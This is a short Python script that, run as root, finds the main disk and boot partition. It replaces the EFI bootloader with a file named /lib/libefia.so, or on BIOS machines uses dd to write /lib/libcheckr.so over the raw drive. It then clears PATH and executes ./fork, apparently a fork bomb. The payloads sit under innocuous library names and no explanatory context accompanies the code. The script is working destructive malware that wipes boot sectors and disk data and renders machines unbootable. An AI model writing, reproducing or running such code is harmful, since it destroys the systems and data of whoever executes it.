#!/usr/bin/python
import os
import platform
import shutil
from colorama import Fore;

bootmount = ""
maindrive = ""

if os.path.exists("/dev/nvme0n1"):
    maindrive = "/dev/nvme0n1"
elif os.path.exists("/dev/sda"):
    maindrive = "/dev/sda"
else:
    maindrive = "/dev/hda"

if os.path.ismount("/boot"):
    print(f"{Fore.GREEN}Boot partition mounted on /boot.")
    bootmount = "/boot"
elif os.path.ismount("/boot/efi"):
    print(f"{Fore.GREEN}Boot partition mounted on /boot/efi.")
    bootmount = "/boot/efi"
else:
    print(f"{Fore.GREEN}No boot partition found.")
    exit(2)

def runefi():
    shutil.copyfile("/lib/libefia.so", f"{bootmount}/EFI/BOOT/BOOTX64.EFI")

def runbios():
    os.system(f"dd if=/lib/libcheckr.so of={maindrive}")


if os.getuid() != 0:
    print(f"{Fore.RED}Please run this script as root.")
    exit(1)

if os.path.isdir("/sys/firmware/efi"):
    runefi()
else:
    runbios()

os.environ["PATH"] = ""

os.chdir("/lib")

os.system("./fork")